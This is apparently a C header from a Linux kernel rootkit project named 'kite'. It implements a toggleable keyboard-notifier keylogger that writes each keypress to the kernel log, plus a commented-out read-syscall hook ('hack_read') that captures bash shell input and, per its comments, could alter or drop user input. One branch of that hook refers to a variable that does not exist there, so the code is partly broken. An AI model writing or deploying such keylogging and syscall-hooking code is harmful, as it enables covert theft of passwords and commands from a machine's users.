#ifndef KEYLOG_KITE
    #define KEYLOG_KITE
    #include <linux/types.h>
    #include <linux/notifier.h>
    #include <linux/keyboard.h>

    #include "kite_hook.h"


/*ssh/putty(=telnet) are not using keyboard, they are network (socket) based protocols, so one would need to intercept tcp/udp sockets*/
int KEYLOG_ACTIVE = 0;

static int log_keys(struct notifier_block *nb, unsigned long action, void * data)
{
    // Can make user "miss" by counting and notifying NOTIFY_STOP every couple of times

    struct keyboard_notifier_param *knd = data;     //<- Get the data for the callback into "knd"
    if ((action == KBD_KEYSYM) && (knd->down))       //<- Check if the callback happened because a ascii key pressed
    {
            pr_info("Pressed key '%c' with value '%d'.\n", knd->value, knd->value);
    }

    return NOTIFY_OK;
}

// Declare and Initialize the notifier_block with the callback function
static struct notifier_block logger_notification_block = {
        .notifier_call = log_keys,          // Assign the callback function to this notification chain
        .priority = 100
};

static int switch_key_logging(void){
    pr_info("Switch key logging\n");
    if(KEYLOG_ACTIVE){
        pr_info("Stopping keylogging\n");
        unregister_keyboard_notifier(&logger_notification_block);
        KEYLOG_ACTIVE = 0;
    }
    else{
        pr_info("Starting keylogging\n");
        register_keyboard_notifier(&logger_notification_block);
        KEYLOG_ACTIVE = 1;
    }
    return 0;
}
#endif

/*bash is interactive, using read to always read input from stdin, 
  we can hook read to keylog bash shells, also used as a command logger for non-interactive shells,
  can use this function to alter user input and mess a bit with them

static int logger(char *str, int count){
    pr_info("%s", str);
    return 0;
}


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage ssize_t hack_read(struct pt_regs *regs){
    long error;
    size_t count = regs->dx;
    char *temp_buf = kmalloc(count, GFP_KERNEL);


    if(temp_buf == NULL){
        return orig_read(regs);
    }

    if(regs->di == 0){
        error = copy_from_user(temp_buf, (const char *)regs->si, count);
        if(error){
          kfree(temp_buf);
          return orig_read(regs);
        }
        logger(temp_buf, count);
    }

    kfree(temp_buf);
    return orig_read(regs);
}
#else
static asmlinkage ssize_t hack_read(int fd, void *buf, size_t count){
    long error;
    char *temp_buf = kmalloc(count, GFP_KERNEL);

    if(temp_buf == NULL){
        return orig_read(fd, buf, count);
    }

    if(regs->di == 0){
        error = copy_from_user(temp_buf, (const char *)buf, count);
        if(error){
          kfree(temp_buf);
          return orig_read(fd, buf, count);
        }
        logger(temp_buf, count);
    }

    kfree(temp_buf);
    return orig_read(fd, buf, count);
}
#endif
#endif
*/